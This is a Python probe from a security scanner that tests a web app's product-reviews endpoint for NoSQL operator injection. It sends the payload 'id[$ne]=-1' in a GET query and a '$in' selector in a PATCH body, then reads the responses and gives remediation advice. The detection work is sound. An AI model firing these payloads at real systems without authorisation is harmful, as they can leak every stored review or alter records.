#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Injection: NoSQL operator-injection on the product-reviews GET.

`GET /rest/products/reviews?id=<id>` should match a single product.
When the framework parses `id[$ne]=-1` as a Mongo query operator
(Express's `qs` parser does this by default), the request becomes
`find({_id: {$ne: -1}})` and returns EVERY review across EVERY
product. The differential is loud — a single-product GET returns
reviews for one productId; the operator-injected form returns
reviews spanning many.

Detection signal:
  GET /rest/products/reviews?id[$ne]=-1 → 200 with a JSON envelope
  whose rows span >1 distinct `product` (or `productId`) value.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

REVIEWS_PATH_INJECTED = "/rest/products/reviews?id[$ne]=-1"


class NosqlReviewOperatorInjectionProbe(Probe):
    name = "nosql_review_operator_injection"
    summary = ("Detects NoSQL operator-injection on the reviews GET — "
               "id[$ne]=-1 leaks reviews from every product.")
    safety_class = "read-only"

    def add_args(self, parser):
        pass

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        url = urljoin(origin, REVIEWS_PATH_INJECTED)
        r = client.request("GET", url)
        attempt = {"url": url, "status": r.status, "size": r.size}

        # Round-2 addition: PATCH variant. The GET-with-bracket-syntax
        # variant above relies on Express's `qs` parser deep-parsing
        # the query string. The PATCH variant exercises a different
        # code path -- the JSON body parser -- and catches apps that
        # use a Mongo-style `findOneAndUpdate` driver with the request
        # body's `id` field as the selector. Juice Shop's
        # PATCH /rest/products/reviews is the canonical case.
        # Safety: we send a $in selector whose values are random hex
        # marker strings that cannot exist as real review ids. If the
        # operator is honored, the selector matches zero documents
        # and the server returns {"modified": 0, ...} -- proof of
        # operator-honoring without actually modifying state. The
        # `message` we'd write is also a probe marker, but it never
        # lands because modified is always 0 in the safe path.
        import secrets as _secrets   # local import to avoid top-of-file churn
        impossible_ids = [
            f"nextgen-dast-probe-{_secrets.token_hex(8)}"
            for _ in range(3)]
        patch_body = json.dumps({
            "id": {"$in": impossible_ids},
            "message": "nextgen-dast-probe-marker-do-not-keep",
        }).encode()
        patch_url = urljoin(origin, "/rest/products/reviews")
        rp = client.request("PATCH", patch_url, headers={
            "Content-Type": "application/json",
        }, body=patch_body)
        patch_attempt = {"url": patch_url, "method": "PATCH",
                         "status": rp.status, "size": rp.size,
                         "body_excerpt": (rp.text or "")[:200]}
        # Heuristic: if the server returns 200 with a JSON body
        # containing a "modified" key (any value, including 0), the
        # $in operator was parsed as a Mongo selector. That alone
        # proves the endpoint accepts attacker-controlled operators
        # on the body's id field -- which is the underlying defect
        # whether or not our specific marker happened to match a real
        # row. If the server rejects (4xx) or returns a body lacking
        # `modified`, the operator was not honored.
        patch_validated = False
        modified_value = None
        if 200 <= rp.status < 300 and rp.body:
            try:
                pdoc = json.loads(rp.text)
            except json.JSONDecodeError:
                pdoc = None
            if isinstance(pdoc, dict) and "modified" in pdoc:
                patch_validated = True
                modified_value = pdoc.get("modified")
                patch_attempt["modified"] = modified_value
                patch_attempt["original_rows"] = (
                    len(pdoc.get("original") or [])
                    if isinstance(pdoc.get("original"), list) else None)

        evidence = {"origin": origin, "get_attempt": attempt,
                    "patch_attempt": patch_attempt}

        if patch_validated:
            return Verdict(
                validated=True, confidence=0.93,
                summary=(f"Confirmed: NoSQL operator-injection on "
                         f"PATCH {patch_url} -- server honored a $in "
                         f"operator on the JSON body's `id` field and "
                         f"returned modified={modified_value!r}. The "
                         f"selector used was a list of synthetic "
                         f"non-existent ids so no real review rows "
                         f"were modified (modified=0 is the expected "
                         f"safe outcome here; the proof is that the "
                         f"endpoint parsed the operator at all)."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Reject non-scalar values on `id`-shaped path / "
                    "body parameters before passing them to the Mongo "
                    "driver. Either:\n"
                    "  - Validate the body with a JSON-schema that "
                    "requires id to be a string or number, OR\n"
                    "  - Coerce the value before query: "
                    "`req.body.id = String(req.body.id)` so an object "
                    "is stringified to '[object Object]' and matches "
                    "nothing.\n"
                    "Either fix MUST run on the SERVER (Express middle-"
                    "ware), not the frontend, since the bug is reached "
                    "by direct curl."),
            )

        if r.status != 200 or not r.body:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: operator-injected GET on {url} "
                         f"returned status {r.status}; PATCH variant "
                         f"also did not surface a `modified` field."),
                evidence=evidence,
            )
        try:
            doc = json.loads(r.text)
        except json.JSONDecodeError:
            return Verdict(
                validated=False, confidence=0.6,
                summary="Inconclusive: response not JSON.",
                evidence=evidence,
            )
        rows = doc.get("data") if isinstance(doc, dict) else doc
        if not isinstance(rows, list):
            return Verdict(
                validated=False, confidence=0.6,
                summary="Inconclusive: response shape unexpected.",
                evidence=evidence,
            )
        product_ids: set = set()
        for row in rows:
            if isinstance(row, dict):
                pid = row.get("product") or row.get("productId") \
                      or row.get("ProductId")
                if pid is not None:
                    product_ids.add(pid)
        attempt["row_count"]      = len(rows)
        attempt["distinct_pids"]  = len(product_ids)
        attempt["sample_pids"]    = sorted(list(product_ids))[:8]

        if len(product_ids) >= 2:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: operator-injection on {url} — "
                         f"response spans {len(product_ids)} distinct "
                         f"product ids ({len(rows)} review rows). The "
                         "$ne operator was honored as a query filter."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Disable Express' default `qs` parser flag that "
                    "deep-parses bracket syntax: "
                    "`app.set('query parser', 'simple')`, or coerce "
                    "the id parameter to a primitive before building "
                    "the query. Validate id with a JSON-schema or "
                    "regex BEFORE passing it to the model layer."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: operator-injected GET on {url} "
                     "returned reviews for at most one product id — "
                     "operator was not honored as a filter."),
            evidence=evidence,
        )


if __name__ == "__main__":
    NosqlReviewOperatorInjectionProbe().main()
